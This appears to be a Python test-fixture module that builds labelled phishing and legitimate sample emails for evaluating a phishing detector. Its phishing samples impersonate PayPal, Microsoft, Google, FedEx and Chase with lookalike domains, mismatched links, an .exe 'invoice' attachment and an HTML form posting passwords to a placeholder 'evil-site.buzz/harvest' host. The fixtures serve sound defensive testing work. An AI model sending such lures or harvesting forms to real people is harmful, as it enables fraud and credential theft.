"""
Sample email generator for phishing detector testing and demos.

Creates realistic phishing and legitimate emails across several
categories so we can test detection accuracy without real email data.
"""

from __future__ import annotations


def generate_sample_emails() -> list[dict]:
    """
    Generate a mix of phishing and legitimate emails.
    Returns list of email dicts with a 'label' field for evaluation.
    """
    emails = []
    emails.extend(_phishing_emails())
    emails.extend(_legitimate_emails())
    return emails


def _phishing_emails() -> list[dict]:
    """Generate various types of phishing emails."""
    return [
        # Classic account suspension phish
        {
            "subject": "Urgent: Your Account Has Been Suspended",
            "body": (
                "Dear Customer,\n\n"
                "We have detected unusual activity on your account. "
                "Your account will be suspended within 24 hours unless you verify your identity.\n\n"
                "Click here to verify now: http://paypa1-security.xyz/verify?id=38291\n\n"
                "Failure to respond will result in permanent account closure.\n\n"
                "PayPal Security Team"
            ),
            "sender_name": "PayPal Security",
            "sender_email": "security@paypa1-support.xyz",
            "reply_to": "",
            "attachments": [],
            "label": "phishing",
            "phishing_type": "account_suspension",
        },
        # Password reset phish with IP-based URL
        {
            "subject": "Password Reset Required - Action Required",
            "body": (
                "Dear Valued Customer,\n\n"
                "As part of our routine security update, you are required to reset your password.\n\n"
                "Please click the link below to reset your password:\n"
                "http://192.168.45.123/microsoft/reset-password\n\n"
                "This link will expire in 2 hours. If you don't act now, "
                "your account will be locked.\n\n"
                "Microsoft Account Team"
            ),
            "sender_name": "Microsoft Account",
            "sender_email": "no-reply@microsoft-account-verify.top",
            "reply_to": "support@randomdomain.xyz",
            "attachments": [],
            "label": "phishing",
            "phishing_type": "password_reset",
        },
        # Prize/lottery scam
        {
            "subject": "Congratulations! You've Won $1,000,000!",
            "body": (
                "Dear Lucky Winner,\n\n"
                "Congratulations! You have been selected as the winner of our annual lottery!\n"
                "You have won a prize of $1,000,000 USD.\n\n"
                "To claim your reward, please provide the following:\n"
                "- Full Name\n- Bank Account Number\n- Phone Number\n\n"
                "Reply immediately to claim your prize before it expires!\n\n"
                "International Lottery Commission"
            ),
            "sender_name": "Lottery Commission",
            "sender_email": "winner@free-lottery-prize.ml",
            "reply_to": "claim@gmail.com",
            "attachments": [],
            "label": "phishing",
            "phishing_type": "lottery_scam",
        },
        # Malicious attachment phish
        {
            "subject": "Invoice #INV-2025-3847 Attached",
            "body": (
                "Hi,\n\n"
                "Please find the attached invoice for your recent purchase.\n"
                "The payment is due within 48 hours to avoid late fees and legal action.\n\n"
                "If you have any questions, contact our billing department.\n\n"
                "Best regards,\nAccounting Department"
            ),
            "sender_name": "Accounting",
            "sender_email": "billing@company-invoices.work",
            "reply_to": "",
            "attachments": ["Invoice_INV-2025-3847.exe"],
            "label": "phishing",
            "phishing_type": "malicious_attachment",
        },
        # Credential harvesting with embedded form
        {
            "subject": "Verify Your Email Address",
            "body": (
                '<html><body>'
                '<p>Dear User,</p>'
                '<p>We detected unauthorized access to your account. '
                'Verify your identity immediately:</p>'
                '<form action="http://evil-site.buzz/harvest">'
                '<input type="text" name="email" placeholder="Email">'
                '<input type="password" name="pass" placeholder="Password">'
                '<button type="submit">Verify Now</button>'
                '</form>'
                '<p>If you don\'t verify within 24 hours, your account will be terminated.</p>'
                '</body></html>'
            ),
            "sender_name": "Google Security",
            "sender_email": "noreply@google-security-check.click",
            "reply_to": "",
            "attachments": [],
            "label": "phishing",
            "phishing_type": "credential_harvest",
        },
        # Shortened URL phish
        {
            "subject": "Your package delivery failed",
            "body": (
                "Dear Customer,\n\n"
                "We were unable to deliver your package. "
                "Please confirm your shipping address:\n\n"
                "http://bit.ly/3x8Kf9z\n\n"
                "If you don't respond immediately, your package will be returned.\n\n"
                "FedEx Delivery Team"
            ),
            "sender_name": "FedEx Delivery",
            "sender_email": "delivery@fedex-notification.gq",
            "reply_to": "",
            "attachments": [],
            "label": "phishing",
            "phishing_type": "delivery_scam",
        },
        # Spear phishing with display name spoofing
        {
            "subject": "Quick question about the project",
            "body": (
                "Hi,\n\n"
                "Can you review this document and send me your feedback?\n\n"
                "https://docs.google.com.evil-site.xyz/shared/document/review\n\n"
                "I need it urgently before our meeting tomorrow.\n\n"
                "Thanks,\nJohn"
            ),
            "sender_name": "john.smith@company.com",
            "sender_email": "john.smith.work@gmail.com",
            "reply_to": "",
            "attachments": [],
            "label": "phishing",
            "phishing_type": "spear_phishing",
        },
        # Banking phish with mismatched URL
        {
            "subject": "Important: Unusual Login Activity Detected",
            "body": (
                '<html><body>'
                '<p>Dear Account Holder,</p>'
                '<p>We noticed unusual activity on your account. '
                'Please verify your identity to avoid account suspension.</p>'
                '<p><a href="http://chase-verify.tk/login">https://www.chase.com/secure/verify</a></p>'
                '<p>This is a security alert. Respond within 24 hours.</p>'
                '</body></html>'
            ),
            "sender_name": "Chase Bank Alerts",
            "sender_email": "alerts@chase-banking-secure.top",
            "reply_to": "",
            "attachments": [],
            "label": "phishing",
            "phishing_type": "banking_phish",
        },
    ]


def _legitimate_emails() -> list[dict]:
    """Generate various types of legitimate emails."""
    return [
        # Normal work email
        {
            "subject": "Team meeting notes - March 28",
            "body": (
                "Hi team,\n\n"
                "Here are the notes from today's standup:\n\n"
                "1. Backend API is on track for Friday release\n"
                "2. Design review scheduled for Thursday\n"
                "3. Sarah will handle the client demo\n\n"
                "Let me know if I missed anything.\n\n"
                "Best,\nAlex"
            ),
            "sender_name": "Alex Johnson",
            "sender_email": "alex.johnson@company.com",
            "reply_to": "",
            "attachments": [],
            "label": "legitimate",
        },
        # Newsletter
        {
            "subject": "This Week in Tech - Newsletter #142",
            "body": (
                "Welcome to this week's tech roundup.\n\n"
                "Top stories:\n"
                "- New programming language released\n"
                "- Cloud computing trends for 2025\n"
                "- Interview with startup founder\n\n"
                "Read more at https://technewsletter.com/issue/142\n\n"
                "Unsubscribe: https://technewsletter.com/unsubscribe"
            ),
            "sender_name": "Tech Newsletter",
            "sender_email": "newsletter@technewsletter.com",
            "reply_to": "",
            "attachments": [],
            "label": "legitimate",
        },
        # E-commerce order confirmation
        {
            "subject": "Order Confirmation #ORD-8834721",
            "body": (
                "Thank you for your purchase!\n\n"
                "Order #ORD-8834721\n"
                "Items: Wireless Headphones x1\n"
                "Total: $79.99\n"
                "Shipping: Free\n"
                "Estimated delivery: April 3-5\n\n"
                "Track your order: https://amazon.com/orders/8834721\n\n"
                "Amazon Customer Service"
            ),
            "sender_name": "Amazon Orders",
            "sender_email": "orders@amazon.com",
            "reply_to": "",
            "attachments": [],
            "label": "legitimate",
        },
        # Calendar invite
        {
            "subject": "Invitation: Project Review @ Thursday 2pm",
            "body": (
                "You're invited to a meeting.\n\n"
                "Project Review\n"
                "When: Thursday, March 30 at 2:00 PM\n"
                "Where: Conference Room B / Zoom link below\n"
                "https://zoom.us/j/123456789\n\n"
                "Agenda:\n"
                "- Q1 progress review\n"
                "- Q2 planning\n"
                "- Resource allocation"
            ),
            "sender_name": "Maria Chen",
            "sender_email": "maria.chen@company.com",
            "reply_to": "",
            "attachments": [],
            "label": "legitimate",
        },
        # GitHub notification
        {
            "subject": "Re: [project/repo] Fix login validation (#234)",
            "body": (
                "@developer pushed 2 commits to fix-login-validation\n\n"
                "- Fixed null check on email field\n"
                "- Added unit tests for edge cases\n\n"
                "View pull request: https://github.com/project/repo/pull/234\n\n"
                "You are receiving this because you are subscribed."
            ),
            "sender_name": "GitHub",
            "sender_email": "notifications@github.com",
            "reply_to": "reply+abc123@reply.github.com",
            "attachments": [],
            "label": "legitimate",
        },
        # Legitimate password reset
        {
            "subject": "Password reset request",
            "body": (
                "Hi,\n\n"
                "We received a request to reset your password. "
                "If you made this request, click the link below:\n\n"
                "https://accounts.google.com/reset?token=abc123xyz\n\n"
                "If you didn't request this, you can safely ignore this email.\n\n"
                "This link expires in 1 hour.\n\n"
                "Google Accounts"
            ),
            "sender_name": "Google",
            "sender_email": "no-reply@accounts.google.com",
            "reply_to": "",
            "attachments": [],
            "label": "legitimate",
        },
        # Normal attachment email
        {
            "subject": "Q1 Report - Final Version",
            "body": (
                "Hi team,\n\n"
                "Attached is the final Q1 report with the updated charts.\n\n"
                "Please review before Friday's board meeting.\n\n"
                "Thanks,\nFinance Team"
            ),
            "sender_name": "Finance Team",
            "sender_email": "finance@company.com",
            "reply_to": "",
            "attachments": ["Q1_Report_Final.pdf"],
            "label": "legitimate",
        },
        # Support ticket response
        {
            "subject": "Re: Support Ticket #4521 - Login Issue",
            "body": (
                "Hi,\n\n"
                "Thanks for contacting support. We've looked into your login issue.\n\n"
                "It appears your account was temporarily locked due to multiple "
                "failed login attempts. We've unlocked it for you.\n\n"
                "Please try logging in again. If the issue persists, "
                "let us know and we'll investigate further.\n\n"
                "Best regards,\nSupport Team"
            ),
            "sender_name": "Support Team",
            "sender_email": "support@company.com",
            "reply_to": "",
            "attachments": [],
            "label": "legitimate",
        },
    ]
